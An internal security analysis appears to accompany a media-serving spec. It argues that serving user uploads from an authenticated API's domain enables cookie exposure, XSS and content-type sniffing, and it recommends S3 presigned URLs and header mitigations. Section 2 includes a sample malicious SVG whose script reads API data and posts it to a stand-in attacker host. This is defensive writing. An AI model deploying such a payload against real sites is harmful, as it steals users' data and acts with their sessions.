# Same-Domain Media Serving — Security Risks

**Date:** 2026-03-23
**Sources:** Codebase investigation, OWASP, security best practices

## The Core Problem

Serving user-uploaded media from the **same domain** as an authenticated API creates multiple attack vectors because the browser's same-origin policy treats all content from that domain as equally trusted.

## Attack Vectors

### 1. Cookie Leakage (Automatic)

Session cookies are sent with **every** request to the same domain — including `<img src>` media requests. This is unnecessary exposure of auth credentials.

**Evidence from codebase:**
- `packages/agents-core/src/auth/auth.ts` (lines 165-188): Better Auth session cookies configured with `httpOnly: true`, `sameSite: 'none|lax'`, `secure: true`
- In production, `cookieDomain` is set to a shared domain (e.g., `.inkeep.com`), meaning cookies are sent to ALL subdomains

Even if the media route doesn't use cookies for auth (e.g., uses HMAC signatures), the cookies are still sent — visible in server logs, potentially in error reporting, and available to any script executing in that origin.

### 2. XSS via Uploaded Content (Critical)

If an attacker uploads a malicious SVG or HTML file and it's served from the API's origin:
- The browser executes embedded scripts in the API's origin context
- `httpOnly` cookies can't be read by JS directly, BUT the script can **make same-origin fetch/XHR requests that automatically include the cookies**
- The script effectively acts as the logged-in user — can call any API endpoint

**Example attack:**
```svg
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    // Can't read the cookie directly (httpOnly), but can USE it:
    fetch('/manage/api/agents', { credentials: 'same-origin' })
      .then(r => r.json())
      .then(data => {
        // Exfiltrate agent configs, API keys, etc.
        fetch('https://attacker.com/steal', { method: 'POST', body: JSON.stringify(data) });
      });
  </script>
</svg>
```

### 3. Cross-Subdomain Cookie Sharing

When `cookieDomain=.inkeep.com`, cookies are shared across:
- `api.inkeep.com` (API)
- `app.inkeep.com` (manage UI)
- `media.inkeep.com` (if media served from subdomain)

A subdomain-based media domain does NOT isolate cookies. Only a completely separate domain (e.g., `*.s3.amazonaws.com`) provides true cookie isolation.

### 4. Content-Type Confusion

Current media routes serve files with `Content-Type` from stored metadata. No `X-Content-Type-Options: nosniff` header was found on media routes. Browsers may sniff content types and execute polyglot files (e.g., image file containing valid SVG with embedded scripts).

## Current Mitigations (Partial)

| Mitigation | Status | Gap |
|-----------|--------|-----|
| `httpOnly` cookies | Yes | Prevents direct JS read, but NOT same-origin API calls |
| `secure` flag | Yes | Prevents HTTP transmission, doesn't help with same-origin XSS |
| `sameSite` | `none` or `lax` | `lax` prevents cross-site POST but not same-origin GET |
| `X-Content-Type-Options: nosniff` | **Missing** on media routes | Browsers may sniff types |
| CSP headers on media routes | **Missing** | No script execution restrictions |
| Domain isolation | **Missing** | Media served from same domain as API |

## How S3 Presigned URLs Solve This

S3 presigned URLs point to `*.s3.amazonaws.com` (or a CloudFront distribution) — a **completely different domain** from the API:

1. **No cookie leakage:** Browser does not send `api.inkeep.com` cookies to `s3.amazonaws.com`
2. **XSS sandboxed:** Even if a malicious SVG executes, it runs in S3's origin — zero access to API cookies, localStorage, or same-origin API endpoints
3. **No subdomain confusion:** S3 is a separate registrable domain, not a subdomain of `.inkeep.com`
4. **No proxy needed:** Content is served directly by S3, so no function on the API domain handles user content

This is a **free security benefit** of using S3 presigned URLs — domain isolation comes automatically without any additional infrastructure.

## Recommendation

If staying on a same-domain proxy (Options A/B from the spec), the following mitigations would be required:
- `X-Content-Type-Options: nosniff` on all media responses
- `Content-Disposition: attachment` for non-image types (prevents browser rendering)
- `Content-Security-Policy: default-src 'none'` on media responses (prevents script execution)
- Strict MIME type allowlist (reject SVG, HTML, etc.)
- Ideally: serve from a completely separate registrable domain (not a subdomain)

With S3 presigned URLs (Option C), **all of these are handled automatically by domain isolation**.
